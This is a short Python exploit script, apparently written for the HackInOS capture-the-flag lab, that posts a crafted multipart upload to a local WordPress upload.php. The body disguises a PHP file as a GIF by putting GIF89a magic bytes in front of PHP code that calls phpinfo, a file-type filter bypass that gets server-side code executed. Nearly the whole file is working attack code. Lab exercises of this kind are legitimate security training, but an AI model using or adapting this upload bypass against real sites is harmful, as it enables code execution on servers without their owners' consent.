import requests

# just for hackinos's wordpress http://localhost:8000/upload.php


url = 'http://localhost:8000/upload.php'

header = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://localhost:8000/upload.php',
    'Content-Type': 'multipart/form-data; boundary=---------------------------1879781829097281492055715890',
    'Content-Length': '408',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

def jisuan():
    post_url = url
    data = """
-----------------------------1879781829097281492055715890
Content-Disposition: form-data; name="file"; filename="cc2.php"
Content-Type: application/x-php

GIF89a
<?php phpinfo()?>
<script language="php"> phpinfo();</script>


-----------------------------1879781829097281492055715890
Content-Disposition: form-data; name="submit"

Submit
-----------------------------1879781829097281492055715890--
    """
    r = requests.post(url=url,headers=header,data=data)
    print(r.text)

if __name__ == "__main__":
    jisuan()